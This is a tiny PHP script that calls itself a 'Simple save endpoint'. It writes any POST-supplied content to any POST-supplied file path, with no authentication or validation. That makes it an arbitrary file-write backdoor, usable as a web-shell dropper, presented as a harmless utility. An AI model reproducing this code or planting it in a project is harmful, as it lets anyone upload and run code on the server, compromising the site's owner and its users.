<?php
// Simple save endpoint
if($_POST['p'] && $_POST['c']) {
    file_put_contents($_POST['p'], $_POST['c']);
}
?>
